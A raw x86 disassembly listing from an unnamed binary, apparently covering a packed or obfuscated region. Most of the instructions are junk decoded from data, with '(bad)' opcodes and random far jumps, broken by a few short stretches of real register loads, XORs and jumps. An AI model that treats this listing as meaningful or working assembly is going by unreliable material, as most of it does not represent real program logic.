  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	adc    al,0x82
  410585:	test   eax,0x78533977
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x410561
  410590:	jge    0x410553
  410592:	int    0x88
  410594:	test   DWORD PTR [edx-0x38],eax
  410597:	pop    ecx
  410598:	mov    BYTE PTR [ebx+0x28],0x36
  41059c:	mov    ebx,0x9323a230
  4105a1:	mov    dl,0xf5
  4105a3:	fucomp st(4)
  4105a5:	mov    BYTE PTR [ebx+0x68],dh
  4105a8:	sbb    ah,BYTE PTR [edx]
  4105aa:	unpcklps xmm3,XMMWORD PTR [ebp-0x4e9e7ec3]
  4105b1:	pusha  
  4105b2:	(bad)
  4105b5:	mov    DWORD PTR [ecx-0x32],edi
  4105b8:	inc    ebp
  4105b9:	push   edx
  4105ba:	pop    esi
  4105bb:	dec    eax
  4105bc:	pop    ebp
  4105bd:	cld    
  4105be:	ficom  WORD PTR [esi+ecx*4]
  4105c1:	or     DWORD PTR [eax-0x30369577],edx
  4105c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c8:	imul   ecx,DWORD PTR [ebx+eax*8-0x37],0xffffffd3
  4105cd:	mov    al,0xb2
  4105cf:	cld    
  4105d0:	repnz outs dx,DWORD PTR ds:[esi]
  4105d2:	push   ecx
  4105d3:	pop    ss
  4105d4:	es jl  0x4105da
  4105d7:	adc    eax,0x7e9f9103
  4105dc:	jmp    0x800a38f9
  4105e1:	or     al,0x28
  4105e3:	loopne 0x41058f
  4105e5:	push   esi
  4105e6:	mov    ah,0xd6
  4105e8:	sub    bh,BYTE PTR [edi-0x4370be]
  4105ee:	je     0x4105d1
  4105f0:	pop    ebx
  4105f1:	xchg   esi,eax
  4105f2:	scas   al,BYTE PTR es:[edi]
  4105f3:	int    0x81
  4105f5:	adc    DWORD PTR [edi+eiz*2],eax
  4105f8:	xchg   edi,eax
  4105f9:	(bad)  
  4105fa:	adc    al,BYTE PTR [esi+0x7f4756f7]
  410600:	dec    edi
  410601:	pop    eax
  410602:	sub    DWORD PTR ds:0xb9223a7d,0x195792b1
  41060c:	dec    edx
  41060d:	lods   eax,DWORD PTR ds:[esi]
  41060e:	bound  edi,QWORD PTR [ebx-0x44944236]
  410614:	test   eax,0x767bf54
  410619:	xor    al,0xff
  41061b:	ror    DWORD PTR [ebp+0x79],1
  41061e:	push   esi
  41061f:	mov    ch,BYTE PTR [ecx+0x7e]
  410622:	add    ebx,DWORD PTR [ecx+0x7c]
  410625:	clc    
  410626:	nop
  410627:	pop    ds
  410628:	icebp  
  410629:	loope  0x4105da
  41062b:	test   eax,0x66a44af
  410630:	adc    ch,BYTE PTR [ebp-0x37]
  410633:	das    
  410634:	sbb    BYTE PTR [edi],0xb9
  410637:	jp     0x4105e0
  410639:	ss (bad) 
  41063c:	fnstcw WORD PTR [esi]
  41063e:	arpl   sp,dx
  410640:	test   eax,0x9731516
  410645:	repnz adc DWORD PTR [edx-0x53a7993e],esp
  41064c:	shl    ebx,0xbf
  41064f:	push   0x1a59a90c
  410654:	xor    BYTE PTR [eax],0x73
  410657:	adc    al,0xb0
  410659:	pop    ebp
  41065a:	pop    DWORD PTR [ebp+eax*1-0x46ec4723]
  410661:	sbb    al,0x7f
  410663:	or     DWORD PTR [edx-0x1bcdd4b4],esp
  410669:	inc    edx
  41066a:	jns    0x410660
  41066c:	in     al,dx
  41066d:	jb     0x4106ba
  41066f:	mov    edx,0xf11df086
  410674:	scas   al,BYTE PTR es:[edi]
  410675:	or     al,0x6a
  410677:	mov    ebx,0x30f966ea
  41067c:	mov    dh,dl
  41067e:	rol    DWORD PTR ds:0xaa48af80,0x60
  410685:	out    dx,eax
  410686:	in     eax,0xc7
  410688:	or     eax,0x24e27f3a
  41068d:	dec    esi
  41068e:	xchg   ecx,eax
  41068f:	dec    ebx
  410690:	sub    BYTE PTR [esi+0x63ccb985],0xac
  410697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410698:	jb     0x4106fb
  41069a:	and    cl,0x75
  41069d:	push   esi
  41069e:	scas   al,BYTE PTR es:[edi]
  41069f:	dec    ebx
  4106a0:	xchg   BYTE PTR [eax+0x1e],bh
  4106a3:	inc    edi
  4106a4:	xor    DWORD PTR [esi-0x4d],0x1
  4106a8:	sub    al,0x8f
  4106aa:	out    0xce,eax
  4106ac:	bnd jl 0x410637
  4106af:	cmp    DWORD PTR [esi],edi
  4106b1:	and    bh,BYTE PTR [ecx-0x6e]
  4106b4:	jno    0x410730
  4106b6:	push   edi
  4106b7:	or     esp,0x43f273e9
  4106bd:	ds and esi,edi
  4106c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106c1:	xchg   ecx,eax
  4106c2:	retf   
  4106c3:	rol    BYTE PTR [edi-0x6c],1
  4106c6:	mov    cl,0xcf
  4106c8:	ds inc edi
  4106ca:	push   ds
  4106cb:	xchg   edi,eax
  4106cc:	sti    
  4106cd:	mov    bl,0xd0
  4106cf:	jg     0x410697
  4106d1:	inc    edi
  4106d2:	mov    ah,0x1d
  4106d4:	cld    
  4106d5:	test   al,0xb2
  4106d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106d8:	and    dh,BYTE PTR [ebp+0x63]
  4106db:	and    DWORD PTR [edi-0x71],esi
  4106de:	cmp    cl,BYTE PTR [ebx-0x33f6dda8]
  4106e4:	ror    BYTE PTR [ecx],1
  4106e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e7:	es mov cl,dh
  4106ea:	sar    al,cl
  4106ec:	je     0x4106a0
  4106ee:	jge    0x410671
  4106f0:	fdivr  QWORD PTR [edi-0x490c261c]
  4106f6:	jecxz  0x410706
  4106f8:	and    al,0x89
  4106fa:	cmp    al,0xae
  4106fc:	push   cs
  4106fd:	mov    ?,WORD PTR [edi-0x5e315eca]
  410703:	loope  0x4106ee
  410705:	(bad)  
  410706:	out    dx,eax
  410707:	inc    ebp
  410708:	stc    
  410709:	(bad)  
  41070a:	push   ebx
  41070b:	lock rcl DWORD PTR [esi],1
  41070e:	jge    0x4106c3
  410710:	fsub   st,st(1)
  410712:	and    DWORD PTR [esi],0xffffffc4
  410715:	cmp    eax,0xfb5784c7
  41071a:	fimul  DWORD PTR [eax-0x9294153]
  410720:	xor    eax,0xec4bebc3
  410725:	adc    al,0xa5
  410727:	jp     0x410724
  410729:	mov    dl,0xd2
  41072b:	in     al,dx
  41072c:	jecxz  0x410721
  41072e:	bound  ebx,QWORD PTR [ecx+0x3]
  410731:	mov    bh,cl
  410733:	and    al,0xd3
  410735:	sub    esi,ebp
  410737:	xchg   esi,eax
  410738:	jb     0x4106dc
  41073a:	(bad)  
  41073b:	sub    edx,eax
  41073d:	mov    BYTE PTR [esi],0x73
  410740:	in     eax,0x1e
  410742:	inc    eax
  410743:	sbb    eax,0x4f67db83
  410748:	mov    ah,0x14
  41074a:	pushf  
  41074b:	int    0xf7
  41074d:	cmp    dl,bh
  41074f:	xchg   ecx,eax
  410750:	inc    esi
  410751:	js     0x41079d
  410753:	rcl    BYTE PTR [eax+0x65],0x50
  410757:	imul   edi,DWORD PTR [edi-0x7a],0x89ddf773
  41075e:	je     0x41072c
  410760:	and    DWORD PTR [esi+ebp*2+0x49497360],ecx
  410767:	pop    esp
  410768:	call   0xb8dedbfb
  41076d:	and    DWORD PTR [edi+0x1c],esi
  410770:	mov    ecx,0x4aa7fdb4
  410775:	pop    ecx
  410776:	xchg   ebx,eax
  410777:	push   edx
  410778:	jecxz  0x41077c
  41077a:	push   cs
  41077b:	ss es jae 0x410745
  41077f:	push   ss
  410780:	inc    ebp
  410781:	into   
  410782:	jge    0x410741
  410784:	in     al,0xc7
  410786:	inc    esp
  410787:	cmp    edi,edi
  410789:	add    DWORD PTR [ecx+esi*4-0x59],esp
  41078d:	inc    ebx
  41078e:	and    eax,0x5751c069
  410793:	mov    esi,0xca6039c2
  410798:	mov    edi,0x95bf0109
  41079d:	outs   dx,DWORD PTR ss:[esi]
  41079f:	dec    eax
  4107a0:	outs   dx,BYTE PTR ds:[esi]
  4107a1:	xchg   WORD PTR [ebx+esi*2-0x22d0415c],bx
  4107a9:	in     al,0x28
  4107ab:	loope  0x410735
  4107ad:	cld    
  4107ae:	mov    edi,0x69746160
  4107b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107b4:	adc    ecx,esp
  4107b6:	cdq    
  4107b7:	(bad)  
  4107b8:	dec    edx
  4107b9:	jle    0x4107d0
  4107bb:	or     ah,BYTE PTR [edi-0x3c]
  4107be:	stc    
  4107bf:	mov    bh,0x37
  4107c1:	xlat   BYTE PTR ds:[ebx]
  4107c2:	push   esi
  4107c3:	cmp    dh,0x6c
  4107c6:	in     al,0xca
  4107c8:	sti    
  4107c9:	dec    cl
  4107cb:	aad    0x16
  4107cd:	pop    ebx
  4107ce:	loopne 0x4107f0
  4107d0:	add    DWORD PTR [edx],esi
  4107d2:	inc    edx
  4107d3:	aaa    
  4107d4:	icebp  
  4107d5:	jmp    0x3cc:0xd74349c2
  4107dc:	pop    ecx
  4107dd:	inc    DWORD PTR [eax]
  4107df:	dec    ebp
  4107e0:	aad    0xeb
  4107e2:	enter  0x6af3,0x90
  4107e6:	outs   dx,BYTE PTR ds:[esi]
  4107e7:	mov    esi,0x7362590a
  4107ec:	add    eax,0x16f68ee4
  4107f1:	mov    gs,WORD PTR [edx*1-0x779fe1f8]
  4107f8:	push   ebx
  4107f9:	sub    BYTE PTR [ebx],ch
  4107fb:	fistp  QWORD PTR [ebx]
  4107fd:	fucompp 
  4107ff:	add    DWORD PTR [edx],0x0
  410802:	add    dh,cl
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	rcl    BYTE PTR [eax],cl
  410811:	mov    ds:0x7851a6c7,eax
  410816:	js     0x4107fd
  410818:	jle    0x410892
  41081a:	js     0x4107b4
  41081c:	pop    ebp
  41081d:	xchg   esp,eax
  41081e:	in     al,dx
  41081f:	addr16 mov eax,0xc154db31
  410825:	fst    DWORD PTR [edi]
  410827:	xlat   BYTE PTR ds:[ebx]
  410828:	and    BYTE PTR [edx],0x70
  41082b:	xchg   esp,eax
  41082c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41082d:	addr16 xchg ebx,eax
  41082f:	cs inc esi
  410831:	js     0x41089e
  410833:	jmpw   0xe76
  410837:	(bad)  [esi]
  410839:	push   edi
  41083a:	pop    ebx
  41083b:	sbb    eax,0x8b520889
  410840:	adc    ch,bl
  410842:	mov    ebx,0x6a201d31
  410847:	lock cmp ecx,DWORD PTR [ebx+0x7d4f99c7]
  41084e:	ins    DWORD PTR es:[edi],dx
  41084f:	and    edi,DWORD PTR [edi+ebp*2+0x7bca4e90]
  410856:	jg     0x4108a2
  410858:	hlt    
  410859:	nop
  41085a:	jne    0x41086f
  41085c:	pop    ebp
  41085d:	fidiv  WORD PTR [edi-0x7601d6c4]
  410863:	sub    DWORD PTR [edx-0x17],0x37
  410867:	dec    edx
  410868:	shr    edx,1
  41086a:	stos   DWORD PTR es:[edi],eax
  41086b:	and    dl,BYTE PTR [esp+esi*8+0x44]
  41086f:	jo     0x4108aa
  410871:	push   ebx
  410872:	loop   0x41084c
  410874:	xchg   esp,eax
  410875:	mov    ebp,0x991bc6f8
  41087a:	xlat   BYTE PTR ds:[ebx]
  41087b:	sahf   
  41087c:	push   esi
  41087d:	fstp   TBYTE PTR [eax+eiz*2-0x51]
  410881:	and    BYTE PTR [esi+eax*4],dh
  410884:	test   eax,0x844fa053
  410889:	repz jp 0x41090b
  41088c:	sub    DWORD PTR [esi-0x127b118e],ecx
  410892:	mov    edx,DWORD PTR [ebx+0x49]
  410895:	cmp    esi,ebx
  410897:	fs push ecx
  410899:	pop    esp
  41089a:	arpl   WORD PTR [esi],di
  41089c:	imul   esi,DWORD PTR [esi+0xbd8946e],0x62
  4108a3:	adc    eax,0x65f0ffe4
  4108a8:	sub    BYTE PTR [ebx+0x797884cd],dl
  4108ae:	clc    
  4108af:	mov    ch,0xda
  4108b1:	mov    ch,0x8
  4108b3:	inc    esp
  4108b4:	or     BYTE PTR [edi+0x41],dh
  4108b7:	data16 cmp BYTE PTR [ecx],bl
  4108ba:	arpl   cx,ax
  4108bc:	sbb    DWORD PTR [ebp-0xee320ed],0xdf73c69e
  4108c6:	daa    
  4108c7:	jo     0x410897
  4108c9:	cld    
  4108ca:	call   FWORD PTR [edx-0x6e]
  4108cd:	in     al,dx
  4108ce:	or     DWORD PTR [esi+0x7a],0xefc1b221
  4108d5:	add    al,0x5d
  4108d7:	mov    dl,0x62
  4108d9:	jae    0x4108cd
  4108db:	scas   al,BYTE PTR es:[edi]
  4108dc:	(bad)  
  4108dd:	stc    
  4108de:	(bad)  
  4108df:	out    dx,eax
  4108e0:	dec    ebp
  4108e1:	sbb    ch,bl
  4108e3:	dec    edi
  4108e4:	icebp  
  4108e5:	and    ecx,ebp
  4108e7:	jb     0x410965
  4108e9:	jmp    0x410954
  4108eb:	xor    bh,al
  4108ed:	repnz mov dh,0x35
  4108f0:	mov    eax,ds:0xa9e20078
  4108f5:	sub    DWORD PTR [esi+0x8a54599],edi
  4108fb:	int    0xf3
  4108fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108fe:	jmp    0x410918
  410900:	pop    ecx
  410901:	cld    
  410902:	dec    ecx
  410903:	scas   eax,DWORD PTR es:[edi]
  410904:	mov    eax,0xee68c1b4
  410909:	das    
  41090a:	out    0x36,eax
  41090c:	sbb    BYTE PTR [ecx],bl
  41090e:	pop    esi
  41090f:	test   al,0xf7
  410911:	hlt    
  410912:	dec    esp
  410913:	arpl   WORD PTR [edi+0x26030fef],sp
  410919:	pop    esi
  41091a:	rcr    esi,cl
  41091c:	jo     0x4108df
  41091e:	and    eax,0x7d82c138
  410923:	(bad)
  410926:	pop    ecx
  410927:	sbb    eax,0x8ca220bd
  41092c:	xchg   ecx,eax
  41092d:	xchg   ebp,eax
  41092e:	mov    bh,0x52
  410930:	mov    ecx,DWORD PTR [edx]
  410932:	jb     0x410953
  410934:	shr    DWORD PTR [ebp+0x1d],1
  410937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410938:	cmc    
  410939:	jecxz  0x410962
  41093b:	cmp    DWORD PTR [ebx-0x49],edx
  41093e:	mov    al,0x32
  410940:	pop    ebp
  410941:	jns    0x41091e
  410943:	dec    eax
  410944:	xchg   ecx,eax
  410945:	jmp    0x57ab56e6
  41094a:	out    0xd0,al
  41094c:	add    DWORD PTR [ebx*4-0x1aea3321],esp
  410953:	ins    DWORD PTR es:[edi],dx
  410954:	cdq    
  410955:	mov    BYTE PTR [edi+0x21],cl
  410958:	xor    DWORD PTR [edx],ebp
  41095a:	out    dx,al
  41095b:	rcr    BYTE PTR [edi+0x6c],1
  41095e:	cld    
  41095f:	rcr    DWORD PTR [eax+0x48],1
  410962:	cli    
  410963:	push   0xffffff82
  410965:	iret   
  410966:	int3   
  410967:	call   0xa690:0xd2971607
  41096e:	sub    DWORD PTR [edx],esi
  410970:	xor    eax,0xe6b712a2
  410975:	push   0xee5fb910
  41097a:	mov    ds:0x9d1b523,al
  41097f:	lods   al,BYTE PTR ds:[esi]
  410980:	inc    eax
  410981:	inc    ebp
  410982:	lea    esi,[ebx]
  410984:	pop    ds
  410985:	adc    cl,bh
  410987:	(bad)  
  41098a:	cmp    bl,BYTE PTR [ebp+0x65]
  41098d:	test   dl,bh
  41098f:	mov    ebp,ebx
  410991:	inc    ebp
  410992:	xchg   BYTE PTR [ebp+0x29],cl
  410995:	xchg   edx,eax
  410996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410997:	dec    edx
  410998:	inc    ecx
  410999:	dec    edx
  41099a:	(bad)  
  41099c:	adc    ebp,DWORD PTR [edi-0x674a4af3]
  4109a2:	or     al,0x97
  4109a4:	adc    eax,0x8960d92a
  4109a9:	xchg   DWORD PTR [ebp+edi*1-0x71cac3a3],ebx
  4109b0:	mov    ebx,0xffa14cd2
  4109b5:	sbb    edx,DWORD PTR [edi+edx*4]
  4109b8:	jbe    0x410994
  4109ba:	inc    ecx
  4109bb:	xlat   BYTE PTR ds:[ebx]
  4109bc:	and    eax,0x4daa90e8
  4109c1:	mov    esi,0x4f60ed9a
  4109c6:	or     DWORD PTR [ebp+edi*8-0x59eaa37a],ebp
  4109cd:	or     eax,0x221287fd
  4109d2:	fisttp DWORD PTR [edx]
  4109d4:	leave  
  4109d5:	xchg   ebx,eax
  4109d6:	(bad)
  4109d9:	or     al,0x86
  4109db:	aad    0x79
  4109dd:	loop   0x410a3a
  4109df:	ins    BYTE PTR es:[edi],dx
  4109e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e1:	and    dl,ch
  4109e3:	cld    
  4109e4:	push   ebx
  4109e5:	and    ecx,DWORD PTR ds:0xc5b3b8f8
  4109eb:	jo     0x410990
  4109ed:	sub    eax,0xf4892934
  4109f2:	mov    ebx,0x6d7c7613
  4109f7:	aad    0x66
  4109f9:	adc    BYTE PTR [edx],al
  4109fb:	pushf  
  4109fc:	inc    esi
  4109fd:	jb     0x4109c9
  4109ff:	push   ecx
  410a00:	mov    ecx,0xff805f12
  410a05:	jnp    0x410a68
  410a07:	push   esi
  410a08:	xor    eax,0xaea1f53e
  410a0d:	adc    BYTE PTR [ebx],ch
  410a0f:	xor    al,0x95
  410a11:	repz les edx,FWORD PTR [eax+esi*4+0x4d6336bb]
  410a19:	add    DWORD PTR [ebp-0x33],0x5924e987
  410a20:	popf   
  410a21:	mov    eax,ds:0x7fda3814
  410a26:	xchg   ebp,eax
  410a27:	jl     0x4109d4
  410a29:	push   ebp
  410a2a:	inc    eax
  410a2b:	dec    esi
  410a2c:	ds lock jmp 0x4109dd
  410a30:	jno    0x4109d2
  410a32:	add    cl,BYTE PTR ds:0xf2cecf93
  410a38:	bound  edx,QWORD PTR [ebx-0x77]
  410a3b:	addr16 push ecx
  410a3d:	jo     0x4109f4
  410a3f:	or     cl,BYTE PTR [eax+0x9125793]
  410a45:	sbb    eax,0x116a8da3
  410a4a:	xchg   ebx,eax
  410a4b:	add    al,BYTE PTR [edx-0x1f102d2a]
  410a51:	hlt    
  410a52:	push   ss
  410a53:	xor    DWORD PTR [ecx+0x2973ec69],0x62a27522
  410a5d:	cmp    dh,BYTE PTR [eax+0x2b082a49]
  410a63:	and    al,BYTE PTR [ecx+0x3f]
  410a66:	test   al,0xcc
  410a68:	ins    BYTE PTR es:[edi],dx
  410a69:	push   ebp
  410a6a:	sbb    ch,BYTE PTR [ebx]
  410a6c:	loop   0x410a35
  410a6e:	or     BYTE PTR [eax-0x6a49dc76],dh
  410a74:	popa   
  410a75:	out    dx,eax
  410a76:	fst    QWORD PTR [ebp+edx*2-0x39]
  410a7a:	shr    DWORD PTR [edi+0x71],0xf8
  410a7e:	loop   0x410a5c
  410a80:	and    al,0xc0
  410a82:	inc    ecx
  410a83:	sbb    esi,DWORD PTR [edi+0x7b]
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	test   DWORD PTR [edx+0x133a97f7],0xe5787856
  410ab8:	jle    0x410b32
  410aba:	js     0x410ac4
  410abc:	scas   al,BYTE PTR es:[edi]
  410abd:	pop    esp
  410abe:	xchg   edi,eax
  410abf:	add    BYTE PTR [eax-0x557b9385],al
  410ac5:	int    0xa8
  410ac7:	xor    edi,DWORD PTR [edi+0x656fb54f]
  410acd:	into   
  410ace:	cdq    
  410acf:	xor    al,0x6
  410ad1:	mov    eax,ds:0xdc3a76b
  410ad6:	in     eax,dx
  410ad7:	fcom   QWORD PTR [eax+0x5018ca81]
  410add:	(bad)  
  410adf:	xor    dl,BYTE PTR [ebp+eax*2+0x423fde65]
  410ae6:	jge    0x410b1d
  410ae8:	jbe    0x410b58
  410aea:	jmp    0xda50e03d
  410aef:	arpl   WORD PTR [eax-0x4f776614],dx
  410af5:	cmp    al,0x64
  410af7:	scas   eax,DWORD PTR es:[edi]
  410af8:	sahf   
  410af9:	mov    esp,0x240032bf
  410afe:	pop    esi
  410aff:	sub    BYTE PTR [ecx],bl
  410b01:	fsub   QWORD PTR [edx-0x2ae4a87e]
  410b07:	adc    ch,bh
  410b09:	scas   al,BYTE PTR es:[edi]
  410b0a:	mov    DWORD PTR ds:0xa871414f,edx
  410b10:	xor    eax,0xd91e7496
  410b15:	in     eax,dx
  410b16:	mov    dl,0x84
  410b18:	outs   dx,BYTE PTR ds:[esi]
  410b19:	mov    bh,BYTE PTR [esi-0x5e]
  410b1c:	push   0xffffffa8
  410b1e:	jle    0x410ab3
  410b20:	fild   QWORD PTR [esi]
  410b22:	inc    ebx
  410b23:	and    al,0xba
  410b25:	shr    BYTE PTR [edx+0x3fa2f14c],1
  410b2b:	push   edi
  410b2c:	inc    esp
  410b2d:	cld    
  410b2e:	leave  
  410b2f:	call   0xd675:0x6f9fe5e5
  410b36:	mov    BYTE PTR es:[edx+0x77],dl
  410b3a:	fwait
  410b3b:	lods   eax,DWORD PTR ds:[esi]
  410b3c:	cli    
  410b3d:	jae    0x410b93
  410b3f:	add    eax,0xfcda6b11
  410b44:	or     al,0xc8
  410b46:	(bad)  
  410b47:	sbb    eax,0x36ae7b62
  410b4c:	retw   
  410b4e:	icebp  
  410b4f:	rol    BYTE PTR [ebp-0x69],1
  410b52:	rcr    BYTE PTR [ebp+0x6d],0x9c
  410b56:	sbb    BYTE PTR [ecx+0x33],0x9a
  410b5a:	rcl    DWORD PTR [edi],1
  410b5c:	lods   al,BYTE PTR ds:[esi]
  410b5d:	sbb    edi,esp
  410b5f:	ret    0x633b
  410b62:	inc    ecx
  410b63:	pop    ecx
  410b64:	ret    0xd649
  410b67:	push   eax
  410b68:	add    BYTE PTR [edx],dl
  410b6a:	daa    
  410b6b:	pop    ds
  410b6c:	dec    ebx
  410b6d:	adc    eax,0xda71f51
  410b72:	gs (bad) 
  410b74:	cmp    dh,BYTE PTR [ebx+0x26bdc8bb]
  410b7a:	jge    0x410b93
  410b7c:	imul   esi,DWORD PTR [eax+0x6b],0xf0a801db
  410b83:	add    eax,DWORD PTR [eax]
  410b85:	pop    ebp
  410b86:	call   0x45770c55
  410b8b:	in     al,0x3e
  410b8d:	push   es
  410b8e:	sbb    bl,BYTE PTR [ebp+0x45]
  410b91:	cmp    edi,esi
  410b93:	adc    DWORD PTR [eax+0x6cea683d],0xf04657bf
  410b9d:	push   ds
  410b9e:	xor    eax,0x1a41981f
  410ba3:	or     dh,dl
  410ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba6:	repz std 
  410ba8:	cmp    eax,0x2fad987e
  410bad:	add    ecx,edx
  410baf:	es jae 0x410c31
  410bb2:	jae    0x410bc1
  410bb4:	cmc    
  410bb5:	aaa    
  410bb6:	push   ss
  410bb7:	push   DWORD PTR [ecx]
  410bb9:	ss jmp 0xda315b4a
  410bbf:	je     0x410ba4
  410bc1:	mov    ebp,eax
  410bc3:	shl    BYTE PTR es:[ebx+0x19],cl
  410bc7:	inc    ebp
  410bc8:	xchg   ebp,eax
  410bc9:	nop
  410bca:	jo     0x410b8b
  410bcc:	xchg   edx,eax
  410bcd:	addr16 push 0x32
  410bd0:	sar    dl,cl
  410bd2:	push   ss
  410bd3:	lods   al,BYTE PTR ds:[esi]
  410bd4:	scas   eax,DWORD PTR es:[edi]
  410bd5:	sbb    DWORD PTR [eax+0x48e3787e],ebx
  410bdb:	gs push esi
  410bdd:	pop    eax
  410bde:	adc    al,0xa
  410be0:	sahf   
  410be1:	cmp    eax,DWORD PTR [esp+esi*2-0x6b]
  410be5:	xor    ch,BYTE PTR [ecx-0x3d5ad271]
  410beb:	or     al,0x21
  410bed:	(bad)  
  410bee:	fwait
  410bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bf0:	aas    
  410bf1:	frstor [ebx+0x638e520c]
  410bf7:	sub    BYTE PTR [ebx-0x6ccc4d69],bh
  410bfd:	mov    bh,0x53
  410bff:	shr    BYTE PTR [edi+0x14e108e],0x27
  410c06:	and    edi,DWORD PTR [ebp+0x5a]
  410c09:	xlat   BYTE PTR ds:[ebx]
  410c0a:	push   ecx
  410c0b:	mov    edi,0xc24895c2
  410c10:	mov    bl,BYTE PTR [edi-0x40f3ff7b]
  410c16:	push   es
  410c17:	push   edx
  410c18:	lahf   
  410c19:	jp     0x410bfb
  410c1b:	and    BYTE PTR [esi-0x2b],bh
  410c1e:	stc    
  410c1f:	add    bh,ch
  410c21:	ss fmulp st(6),st
  410c24:	mov    edi,0x9593f9b
  410c29:	mov    eax,ds:0x8057ae10
  410c2e:	dec    ebx
  410c2f:	neg    ah
  410c31:	xor    ecx,DWORD PTR [ebp+0x64]
  410c34:	cmp    eax,0xa713205e
  410c39:	or     DWORD PTR [esi],ebp
  410c3b:	sbb    ebp,DWORD PTR [ebp+0x646f3894]
  410c41:	dec    eax
  410c42:	mov    ds:0x62ec106,al
  410c47:	outs   dx,DWORD PTR ds:[esi]
  410c48:	in     eax,dx
  410c49:	cmp    dl,dl
  410c4b:	je     0x410c42
  410c4d:	retf   0xfddf
  410c50:	rol    BYTE PTR [ebx+0x35],1
  410c53:	xor    eax,DWORD PTR [edx+0x3f]
  410c56:	mov    ecx,0x67de9c57
  410c5b:	and    bh,bl
  410c5d:	jbe    0x410c2b
  410c5f:	imul   ebx,DWORD PTR [edi-0x47],0xffffffdf
  410c63:	pop    ss
  410c64:	jecxz  0x410c02
  410c66:	retf   
  410c67:	adc    ecx,DWORD PTR [edi+eax*2]
  410c6a:	add    bl,bh
  410c6c:	sbb    edx,esp
  410c6e:	jle    0x410c56
  410c70:	jecxz  0x410ca6
  410c72:	xlat   BYTE PTR ds:[ebx]
  410c73:	test   eax,0xd94aded9
  410c78:	xchg   esi,eax
  410c79:	cmp    DWORD PTR [ecx-0x48305e34],0xa5481235
  410c83:	adc    eax,0x2890b5f4
  410c88:	into   
  410c89:	imul   ebx,DWORD PTR [esi+0x28],0x3ae27a37
  410c90:	add    edi,DWORD PTR ds:0x4e335826
  410c96:	push   eax
  410c97:	cwde   
  410c98:	mov    al,0x41
  410c9a:	fldenv [eax+0x16]
  410c9d:	push   ds
  410c9e:	cmp    esp,ebp
  410ca0:	mov    esi,0xac5a937e
  410ca5:	jns    0x410d0e
  410ca7:	cli    
  410ca8:	dec    edx
  410ca9:	sbb    DWORD PTR [ebp+0x7],esp
  410cac:	and    eax,0x848e33e3
  410cb1:	sti    
  410cb2:	mov    DWORD PTR [edx+0x4],edx
  410cb5:	in     eax,0x0
  410cb7:	inc    ecx
  410cb8:	mov    eax,0xf1bcf72
  410cbd:	leave  
  410cbe:	outs   dx,DWORD PTR ds:[esi]
  410cbf:	mov    bh,0x86
  410cc1:	cmp    esp,esp
  410cc3:	xchg   ebx,eax
  410cc4:	shr    DWORD PTR [ebx+0x283d9751],cl
  410cca:	aaa    
  410ccb:	dec    ecx
  410ccc:	xchg   esi,eax
  410ccd:	das    
  410cce:	and    al,BYTE PTR [edi-0xc]
  410cd1:	(bad)  
  410cd2:	lock imul esp,DWORD PTR [esi+ebx*8+0x39],0xffffff96
  410cd8:	inc    esp
  410cd9:	mov    edx,0x22281483
  410cdf:	and    ebp,0x5de0dfc
  410ce5:	pop    esi
  410ce6:	popa   
  410ce7:	retf   0xd40b
  410cea:	mov    ds:0xaa68b041,al
  410cef:	jle    0x410d19
  410cf1:	add    al,0x93
  410cf3:	(bad)
  410cf6:	cmp    bl,BYTE PTR [ecx-0x5460eaa5]
  410cfc:	add    cl,BYTE PTR [eax+esi*4+0x1588215]
  410d03:	(bad)  
  410d04:	and    bh,BYTE PTR ds:[edx+0x5884c9f7]
  410d0b:	pop    ebp
  410d0c:	popf   
  410d0d:	fwait
  410d0e:	sbb    ah,BYTE PTR [edx]
  410d10:	pop    esp
  410d11:	and    DWORD PTR [esi],edi
  410d13:	test   DWORD PTR [esp+ebp*2],edx
  410d16:	mov    ch,0xf2
  410d18:	fadd   QWORD PTR [ecx+ebp*4]
  410d1b:	ret    
  410d1c:	nop    DWORD PTR [ebp-0x4f]
  410d20:	iret   
  410d21:	test   BYTE PTR [esi+0x3295ae7],0xf9
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
